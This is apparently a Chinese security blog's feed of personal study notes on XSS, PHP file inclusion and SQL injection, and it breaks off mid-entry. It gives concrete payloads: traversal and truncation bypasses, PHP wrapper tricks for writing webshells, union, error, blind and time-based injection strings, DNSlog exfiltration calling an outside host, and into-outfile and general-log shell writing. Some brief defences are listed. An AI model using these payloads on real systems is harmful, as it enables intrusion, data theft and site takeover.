class="line">利用过程:构造有恶意代码的短连接--&gt;用户点击--&gt;XSS代码被提交到有xss漏洞的web应用程序--&gt;web应用程序没有过滤--&gt;web应用程序输出提交的数据--&gt;用户浏览器渲染返回的HTML页面,执行返回的js代码--&gt;恶意的js代码在后台悄悄运行,获取用户信息.</span><br></pre></td></tr></table></figure><h4 id="存储型XSS-持续型"><a href="#存储型XSS-持续型" class="headerlink" title="存储型XSS(持续型)"></a>存储型XSS(持续型)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存储到服务器数据库</span><br></pre></td></tr></table></figure><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当js代码执行去改变页面元素的时候会导致恶意代码被执行</span><br><span class="line">代码审计篇：</span><br><span class="line">location.hash   location.search   document.referer  innerHTML</span><br><span class="line">indexOf   document.getElementById</span><br><span class="line">防御方法：</span><br><span class="line">主要是检查输入的地方，和会发生dom型xss的函数</span><br></pre></td></tr></table></figure><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反射型和存储型:都需要经过服务器解析,并与数据库产生交互</span><br><span class="line">DOM型:只需要经过前端解析,不与数据库产生交互</span><br><span class="line">存储型和DOM型:都会将攻击代码长期存在受害者的服务器</span><br><span class="line">反射型:只反射一次代码</span><br></pre></td></tr></table></figure><h2 id="XSS挖掘"><a href="#XSS挖掘" class="headerlink" title="XSS挖掘"></a>XSS挖掘</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.看url参数位置</span><br><span class="line">2.看输入框位置</span><br><span class="line">3.输入123456&lt;&gt;&#x27;&quot;--&gt;右键查看源代码,观察特殊字符在页面的显示情况--&gt;没有显示可能存在DOM型xss,也可能不存在xss--&gt;存在,重点观察特殊字符是否被转义,没有被转义,基本可以判断存在,剩下的只是构造问题,被转移就使用未转义的符号拼接.</span><br><span class="line">输出点位置:</span><br><span class="line">1.输出在尖括号外头</span><br><span class="line">&lt;div&gt;输出点&lt;/div&gt; ---&gt; 需要可以构造标签,不能构造就不存在xss</span><br><span class="line">2.输出在尖括号中 ---&gt;如果输出在&quot;双引号或者&#x27;单引号内部，需要能够闭合引号，如果不能闭合引号，就需要看能否在当前的标签属性中执行js代码，如果不能，就不存在XSS漏洞。如果可以闭合引号，可以构造一个新的属性，使用新的属性的值来执行JS代码，比如事件属性。或者闭合尖括号，构造的新的标签也可以。</span><br><span class="line">3.输出到Script标签中 ---&gt;如果输出在&quot;双引号或者&#x27;单引号内部，需要能够闭合引号，如果可以闭合引号，就可以直接传递进去js代码，使用注释符号(//)，注释掉后面的js代码就可以构造XSS.如果不能闭合引号,需要看当前变量能不能innerHTML或者document.write，插入到网页中，如果可以就可以构造XSS，如果没有，就不存在XSS</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.基于黑名单的过滤和基于白名单的过滤</span><br><span class="line">2.cookie中添加http-only属性 </span><br><span class="line">3.用函数对输入进行实体编码和转义htmlspecialchars(&lt;&gt;&#x27;\&quot;&quot;,ENT_QUOTES);  addslashes(&quot;&#x27;\&quot;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含-个人笔记</title>
      <link href="/2020/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h3><p>通过引入文件时,包含的文件名用户可控,且传入的文件名没有经过合理校验或者校验被绕过.</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含:"></a>本地文件包含:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">包含的文件在本地服务器</span><br></pre></td></tr></table></figure><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含:"></a>远程文件包含:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php.ini开启了allow_url_fopen=on和allow_url_include=on配置,包含文件可以是第三方文件</span><br><span class="line">例如:www.localhost.com/test/test.php?page=http://www.sqli.com/test.txt</span><br></pre></td></tr></table></figure><h4 id="文件包含常见函数"><a href="#文件包含常见函数" class="headerlink" title="文件包含常见函数"></a>文件包含常见函数</h4><p>includerequireinclude_once()require_once()</p><p>file_get_contents()—读文件,右键查看源代码,任意文件读取,不能执行php代码</p><p>Fopen()—$a &#x3D; fopen($_GET[‘page’],’r’);  echo fread($a,200);  同上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include:包含文件不存在,程序继续执行.  include_once:重复调用一个文件,程序只调用一次</span><br><span class="line">require:包含文件不存在,程序停止执行. require_once:重复调用一个文件,程序只调用一次</span><br><span class="line">(出现语法错误都不继续执行,找不到文件include继续执行,require停止执行)</span><br></pre></td></tr></table></figure><h2 id="文件包含目录绕过"><a href="#文件包含目录绕过" class="headerlink" title="文件包含目录绕过"></a>文件包含目录绕过</h2><h4 id="x2F-或者-x2F-过滤"><a href="#x2F-或者-x2F-过滤" class="headerlink" title="..&#x2F; 或者 &#x2F; 过滤"></a>..&#x2F; 或者 &#x2F; 过滤</h4><p>…&#x2F;.&#x2F; 或者..\绕过   ..&#x2F; 过滤 —– \ 绕过 &#x2F; 过滤  </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$path</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">     <span class="keyword">include</span> <span class="variable">$path</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;phpinfo.php&#x27;</span></span><br><span class="line">    &#125;    </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="前缀目录绕过"><a href="#前缀目录绕过" class="headerlink" title="前缀目录绕过"></a>前缀目录绕过</h4><p>..&#x2F;..&#x2F;..&#x2F;…..绕过限制目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$path = &#x27;/test/hello/dir/.././ds/&#x27;.$_GET[&#x27;page&#x27;];</span><br></pre></td></tr></table></figure><h2 id="文件包含后缀绕过"><a href="#文件包含后缀绕过" class="headerlink" title="文件包含后缀绕过"></a>文件包含后缀绕过</h2><h4 id="和-23-截断"><a href="#和-23-截断" class="headerlink" title="?和%23(#)截断"></a>?和%23(#)截断</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">例如: www.localhost.com/test/test.php?page=http:<span class="comment">//www.sqli.com/test.html?</span></span><br><span class="line"> www.localhost.com/test/test.php?page=http:<span class="comment">//www.sqli.com/test.html%23</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&#x27;txt&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$path</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable">$path</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;phpinfo.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>目前无法绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;./action/&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] . <span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;./action/show.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd%00</span><br><span class="line">需要magic_quotes_gpc=off</span><br><span class="line">php&lt;5.3.4</span><br></pre></td></tr></table></figure><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd././././....../././</span><br><span class="line">php&lt;5.2.8</span><br><span class="line">linux文件名长于4096,windows需要长于256</span><br></pre></td></tr></table></figure><h2 id="PHP文件包含相关协议"><a href="#PHP文件包含相关协议" class="headerlink" title="PHP文件包含相关协议"></a>PHP文件包含相关协议</h2><h4 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用条件:只是读取,需要开启allow_url_fopen,对allow_url_include不做要求</span><br><span class="line">实现效果:将文件数据进行base64加密后在输出</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需要开启allow_url_include=on,对allow_url_fopen不做要求</span><br><span class="line">要开GET提交---BP转换成POST提交</span><br><span class="line">可以用来写马子---&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;)?&gt;</span><br></pre></td></tr></table></figure><h4 id="date-text-x2F-plain"><a href="#date-text-x2F-plain" class="headerlink" title="date:text&#x2F;plain"></a>date:text&#x2F;plain</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件:开启allow_url_fopen=on  allow_url_include=on</span><br><span class="line">1.用法:?file=data:text/plain,&lt;?php 执行内容 ?&gt;</span><br><span class="line">2.用法:?file=data:text/plain;base64,编码后的php代码---base64编码的php代码不能有+号,否则会和url中的+号编码冲突</span><br></pre></td></tr></table></figure><h4 id="zip协议"><a href="#zip协议" class="headerlink" title="zip协议"></a>zip协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将#编码为%23 PHP版本&gt;=5.3.0</span><br><span class="line">用法:?file=zip://[压缩文件路径+压缩文件名]#[压缩文件内的子文件名]</span><br><span class="line">zip://1.zip%231.txt</span><br><span class="line">zip://1.jpg%231.txt</span><br><span class="line">可以用绝对路径也可以用相对路径</span><br></pre></td></tr></table></figure><h4 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://可以用来访问本地文件系统,且不受allow_url_fopen与allow_url_include的影响</span><br><span class="line">用法:?file=file://文件绝对路径</span><br></pre></td></tr></table></figure><h4 id="Phar协议"><a href="#Phar协议" class="headerlink" title="Phar协议:"></a>Phar协议:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用法:?file=phar://压缩包/内部文件</span><br><span class="line">实例:  pahr://xxx.png/shell.php</span><br><span class="line">注意:PHP&gt;=5.3.0压缩包需要zip协议压缩,rar不行,将木马文件压缩后,改为其他人任意格式的文件都可以正常使用.</span><br><span class="line">步骤:写一个一句话木马文件shell.php,然后用zip协议压缩为shell.zip,然后将后缀改为png等其他格式.</span><br></pre></td></tr></table></figure><h2 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到日志文件存放位置(httpd.ini设置,默认开启)---让日志文件插入PHP代码(BP)---包含日志文件</span><br></pre></td></tr></table></figure><h2 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//没有对session过滤 ,BP抓包在session里放php执行代码    </span></span><br><span class="line"><span class="comment">//从phpinfo.php拿到session存放路径--&gt;sess_+(BP中的)PHPSESSID</span></span><br><span class="line"><span class="comment">//包含绝对路径+sess_id</span></span><br></pre></td></tr></table></figure><h2 id="文件包含防御方法"><a href="#文件包含防御方法" class="headerlink" title="文件包含防御方法"></a>文件包含防御方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.PHP中使用open_basedir配置限制访问在指定的区域</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.过滤./\:</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.禁止服务器远程包含文件(allow_url_fopen=off,allow_url_include=off)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.包含的参数值不可控</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-个人笔记</title>
      <link href="/2020/01/07/SQL/SQL%E7%9F%A5%E8%AF%86--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/07/SQL/SQL%E7%9F%A5%E8%AF%86--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="WEB—-SQL注入"><a href="#WEB—-SQL注入" class="headerlink" title="WEB—-SQL注入"></a>WEB—-SQL注入</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理:"></a>SQL注入原理:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在过滤不严谨或者没有过滤的情况下,存在用户可控参数拼接了sql语句代入数据库执行,数据库返回结果</span><br></pre></td></tr></table></figure><h3 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数:"></a>过滤函数:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> mysql_real_escape_string() ------转义SQL 语句中使用的字符串中的特殊字符 </span><br><span class="line"></span><br><span class="line">addslashes -------转义单引号，双引号，反斜线，null</span><br><span class="line"></span><br><span class="line">intval()-----转换数据类型为整型</span><br></pre></td></tr></table></figure><h3 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式:"></a>闭合方式:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 &#x27; &quot; --&gt;观察报错信息, 检查闭合的符号和逃逸出来的其他字符</span><br></pre></td></tr></table></figure><h3 id="SQL注入数据类型"><a href="#SQL注入数据类型" class="headerlink" title="SQL注入数据类型:"></a>SQL注入数据类型:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">整型   ?id=1 and 1=1 页面正常--------- ?id=1 and 1=2 页面不正常</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​?id=1   页面1内容       ------------     ?id=2-1        页面1内容</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​用sleep()函数 and sleep(5) 整型正常睡眠</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​&#x27; &quot; 单双引号  整型报错</span><br><span class="line"></span><br><span class="line">字符型 ?id=1 and 1=1 页面正常---------?id=1 and 1=2 页面正常</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​?id=1            页面1内容-----------?id=2-1        页面2内容</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​用sleep()函数 and sleep(5) 字符型不执行</span><br><span class="line"></span><br><span class="line">​或者</span><br><span class="line"></span><br><span class="line">​&#x27; &quot; 单双引号  </span><br><span class="line"></span><br><span class="line">**原因:单/双引号 强制转换了类型 **</span><br></pre></td></tr></table></figure><h3 id="SQL注入攻击手法"><a href="#SQL注入攻击手法" class="headerlink" title="SQL注入攻击手法:"></a>SQL注入攻击手法:</h3><h4 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a><strong>union 联合注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前提:多个select语句,知道字段列数,页面有显示位</span><br><span class="line"></span><br><span class="line">1. order by 判断列数</span><br><span class="line"></span><br><span class="line">2. 需要构造的sql语句为真,其他为假--达到执行预计语句的作用</span><br><span class="line"></span><br><span class="line">联合注入配合load_file读文件,into outfile写入文件</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h4><h5 id="函数-floor"><a href="#函数-floor" class="headerlink" title="函数:floor()"></a>函数:floor()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原因:攻击者利用了mysql碰到group by ,count( * )语句会建立虚拟表的特性,结合rand()会被计算多次的特殊性,将floor(rand(0)*2)产生预知序列011011记录到虚拟表中,最终引起主键冗余的报错.</span><br><span class="line"></span><br><span class="line">具体:mysql生成一个虚拟表,表中有key,和count的两个字段.key记录主键,count负责计数.当group by在分组时,遇到预知序列的第一个值0,发现0不存在虚拟表中,于是要将0插入分组,插入数据的行为会将rand()再次触发,生成第二个值1,此时1不存在虚拟表中,最终代替插入到表中.接着遇到第三个值1,1存在,直接计数.接下来到第四个值0,0不存在,所以要插入虚拟表,插入触发了rand(),生成第五个值1,代替0插入.此时分组主键有了1,再次插入就会报错:主键不唯一.</span><br></pre></td></tr></table></figure><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e,(      payload    ),0x7e))</span><br><span class="line"></span><br><span class="line">第一个参数是字符串string类型,更改为int型 达到报错目的</span><br></pre></td></tr></table></figure><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and updatexml(1, (concat(0x7e,(   payload  ),0x7e)),1)</span><br><span class="line"></span><br><span class="line">第一个参数是字符串string类型,更改为int型 达到报错目的</span><br></pre></td></tr></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传递一个大于709的值时，函数exp()就会引起一个溢出错误 </span><br></pre></td></tr></table></figure><h4 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a><strong>布尔注入</strong></h4><h5 id="函数"><a href="#函数" class="headerlink" title="函数:"></a>函数:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> length     min      ascill      ord      like     regexp     left  substr</span><br><span class="line"></span><br><span class="line">​and (select ascii( substr ( ( payload), 1, 1 ) ) )   &gt;   105 </span><br></pre></td></tr></table></figure><h4 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a><strong>时间注入</strong></h4><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((payload), 1, 1))=114, sleep(5), 1)</span><br></pre></td></tr></table></figure><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a><strong>二次注入</strong></h4><h5 id="admin’"><a href="#admin’" class="headerlink" title="admin’#"></a>admin’#</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.插入恶意数据时,仅仅只对特殊字符进行转义(例如利用 mysql_escape_string、mysql_real_escape_string转义 ),最终写入数据还是保留了数据本身的恶意内容,主要是利用了mysql自身会把数据中带有的 / 过滤的特性</span><br><span class="line"></span><br><span class="line">2.没有对从数据库中取出的恶意数据进一步检查和处理</span><br><span class="line"></span><br><span class="line">具体:寻找插入数据库并会转义的操作---&gt;寻找另外一处引用这个数据的操作</span><br><span class="line"></span><br><span class="line">例如常见的注册账号,修改密码处</span><br><span class="line"></span><br><span class="line">影响:造成低权限越权高权限账号,引起更大的危害</span><br></pre></td></tr></table></figure><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><strong>宽字节注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用了类似于set names gbk这样得语句,此时mysql数据库就会将Ascii大于128(%df)的字符当作是汉字字符的一部分,从而能吃掉 \ ,单引号或者双引号逃逸</span><br><span class="line">中文三个字节</span><br></pre></td></tr></table></figure><h4 id="Http头部注入"><a href="#Http头部注入" class="headerlink" title="Http头部注入"></a><strong>Http头部注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-Agent       cookie  -----没有对该参数过滤</span><br><span class="line"></span><br><span class="line">x-forwarded-for  client-ip ----构造注入点  </span><br><span class="line"></span><br><span class="line">预防: 正则--\d--过滤非数字     限制长度</span><br></pre></td></tr></table></figure><h4 id="insert-x2F-update注入-操作很危险"><a href="#insert-x2F-update注入-操作很危险" class="headerlink" title="insert&#x2F;update注入(操作很危险)"></a><strong>insert&#x2F;update注入(操作很危险)</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO Student(name,age) VALUES (&#x27;bob&#x27;, &#x27;15&#x27;) </span><br><span class="line"></span><br><span class="line">闭合时要注意values中有多少个参数,非注入参数也需要写上占位以及括号 </span><br><span class="line"></span><br><span class="line">原因是:valuers后面的值要和前面的字段一致.</span><br><span class="line"></span><br><span class="line"> UPDATE table SET column=mew_value WHERE column= value </span><br><span class="line"></span><br><span class="line">发现注入点,进行闭合时要检查原本语句中的限制条件有没有因为过滤符号过滤了,导致数据库数据被全部修改</span><br></pre></td></tr></table></figure><h4 id="多语句注入-x2F-堆叠注入"><a href="#多语句注入-x2F-堆叠注入" class="headerlink" title="多语句注入&#x2F;堆叠注入 :"></a>多语句注入&#x2F;堆叠注入 :</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库版本5.0以下,注入方式:通过    ;   随意拼接sql语句</span><br></pre></td></tr></table></figure><h3 id="DNSlog外带-window系统–UNC路径"><a href="#DNSlog外带-window系统–UNC路径" class="headerlink" title="DNSlog外带(window系统–UNC路径)"></a>DNSlog外带(window系统–UNC路径)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解决:SQL盲注,无回显的命令执行,无回显的SSRF</span><br><span class="line"></span><br><span class="line">先决条件:load_file(root权限--开启参数secure_file_priv= ---gpc未开启/不过滤单双引号)</span><br><span class="line"></span><br><span class="line">payload:  load_file(concat(&#x27;\\ \ \ \\\&#x27;,(payload),&#x27;.xxxx.ceye.io \ \abc&#x27;))</span><br><span class="line"></span><br><span class="line">​1.特殊字符(例如@)要用十六进制hex()转换</span><br><span class="line"></span><br><span class="line">​2.字段不能超过63 ---substr截断判断</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例如:查询带有特殊字符,字符超过63位的所有数据库</span><br><span class="line"></span><br><span class="line">select hex(     (select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)      )</span><br><span class="line"></span><br><span class="line">select (substr ((hex((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA))),1,63) )</span><br><span class="line"></span><br><span class="line">select 1, load_file(concat(&#x27;\\\\&#x27;,(substr((hex((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA))),1,63)),&#x27;.13f22c.dnslog.cn\\abc&#x27;))</span><br></pre></td></tr></table></figure><h3 id="Mysql写shell方式-load-file-amp-out-file"><a href="#Mysql写shell方式-load-file-amp-out-file" class="headerlink" title="Mysql写shell方式(load_file&amp;out file)"></a>Mysql写shell方式(load_file&amp;out file)</h3><h4 id="读取文件-load-file"><a href="#读取文件-load-file" class="headerlink" title="读取文件(load_file):"></a><strong>读取文件(load_file):</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">LOAD_FILE(&#x27;../../WWW/sqli-labs-master/sql-connections/db-creds.inc&#x27;)      load_file：联合查询中会占一位，用括号单引号包围路径</span><br><span class="line"></span><br><span class="line">1. show global VARIABLES like ‘%secure_file_priv%’;  </span><br><span class="line"></span><br><span class="line">   查看secure_file_priv 参数是否开启 (默认关闭,需要进入mysql.ini添加secure_file_priv=)</span><br><span class="line"></span><br><span class="line">2. 读取文件需要有完整路径</span><br><span class="line"></span><br><span class="line">   select @@datadir  (该参数指定MySQL的数据文件的存放目录，数据库文件即我们常说的 MySQL data 文件)</span><br><span class="line"></span><br><span class="line">   select @@basedir  --&gt; 该参数指定了安装 MySQL 的安装路径(mysql安装目录)，填写全路径可以解决相对路径所造成的问题。                 </span><br><span class="line"></span><br><span class="line">3. root权限</span><br><span class="line"></span><br><span class="line">4. 没有对单双引号过滤/gpc没开启---绕过---char(ASCILL代替的命令)/字符串转hex()</span><br><span class="line"></span><br><span class="line">5. 读取文件必须小于max_allowed_packet </span><br><span class="line">   **datadir查看basedir的存放位置**</span><br></pre></td></tr></table></figure><h4 id="写入文件-into-outfile"><a href="#写入文件-into-outfile" class="headerlink" title="写入文件(into outfile):"></a><strong>写入文件(into outfile):</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">into outfile：联合查询中不占位，用单引号包围路径</span><br><span class="line"></span><br><span class="line">?id=-1 union select 1,&lt;?php phpinfo();?&gt;, 3 into outfile &#x27;C:/phpstudy/WWW/7.php&#x27; --+</span><br><span class="line"></span><br><span class="line">    1. root权限</span><br><span class="line">    2. 数据库中secure_file_priv= 参数开启</span><br><span class="line">    3. 知道数据库的绝对路径</span><br><span class="line">    4. php.ini中的get_magic_quotes_gpc()函数,即魔术引号未开启/单双引号没被过滤</span><br></pre></td></tr></table></figure><h3 id="Mysql写shell方式-全局日志-amp-慢日志"><a href="#Mysql写shell方式-全局日志-amp-慢日志" class="headerlink" title="Mysql写shell方式(全局日志&amp;慢日志)"></a>Mysql写shell方式(全局日志&amp;慢日志)</h3><h4 id="全局日志"><a href="#全局日志" class="headerlink" title="全局日志"></a>全局日志</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1.开启参数</span><br><span class="line">secure_file_priv=    ---&gt;&gt;mysql.ini 配置文件</span><br><span class="line">show variables like&#x27;secure_file_priv&#x27;;   ---查看参数是否开启 </span><br><span class="line">2.开启全局日志 </span><br><span class="line">show variables like&#x27;%general%&#x27;;   on/1--&gt;&gt;开启 off/0--&gt;&gt;关闭</span><br><span class="line">set global general_log = on;</span><br><span class="line">set global general_log_file = &#x27;C:/phpstudy/WWW/shell.php&#x27;; 设置全局日志路径</span><br><span class="line">3.新建查询写入shell</span><br><span 